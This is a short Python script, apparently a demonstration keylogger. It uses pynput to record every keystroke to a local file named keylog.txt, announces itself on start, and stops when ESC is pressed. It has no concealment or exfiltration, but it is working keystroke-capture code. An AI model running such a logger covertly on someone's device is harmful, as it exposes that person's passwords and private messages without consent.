from pynput import keyboard

# Path to the log file where keystrokes will be recorded
log_file = "keylog.txt"

def on_press(key):
    """Callback function that is called when a key is pressed."""
    try:
        # Log the key as a character
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    """Callback function that is called when a key is released."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger started. Press ESC to stop.")
    # Set up the listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
